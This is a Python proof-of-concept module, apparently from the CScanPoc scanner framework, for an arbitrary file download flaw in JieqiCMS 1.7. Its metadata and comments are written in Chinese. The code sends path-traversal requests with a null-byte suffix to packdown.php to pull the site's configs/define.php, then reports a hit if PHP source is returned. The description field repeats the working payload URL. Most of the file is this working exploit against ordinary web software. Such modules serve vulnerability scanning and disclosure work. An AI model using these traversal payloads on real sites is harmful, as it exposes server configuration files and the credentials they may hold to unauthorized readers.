# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'JieqiCMS_0006'  # 平台漏洞编号，留空
    name = '杰奇小说连载系统1.7版本任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-10-10'  # 漏洞公布时间
    desc = '''  
        杰奇小说连载系统1.7版本任意文件下载漏洞。
        构造 /modules/article/packdown.php?id={小说id值}&cid=./../../../../../configs/define.php%00&type=txt&fname=define.php 即可下载任意文件。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0144213'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JieqiCMS(杰奇CMS)'  # 漏洞应用名称
    product_version = '1.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd2ee2e9f-284f-4e8d-b13a-8ca7f20b9fc2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref:http://www.wooyun.org/bugs/wooyun-2010-0144213
            hh = hackhttp.hackhttp()
            arg = self.target
            poc1 = arg + '/modules/article/packdown.php?id=11764&cid=./../../../../../configs/define.php%00&type=txt&fname=define.php'
            poc2 = arg + '/modules/article/packdown.php?id=360&cid=./../../../../../configs/define.php%00&type=txt&fname=define.php'
            code, head, res1, errcode, _ = hh.http(poc1)
            code, head, res2, errcode, _ = hh.http(poc2)
            if code == 200 and "<?php" in res1 and "lang_system.php" in res1:
                #security_hole("jieqicms vulnerable:"+poc1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            elif code == 200 and "<?php" in res2 and "lang_system.php" in res2:
                #security_hole("jieqicms vulnerable:"+poc1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
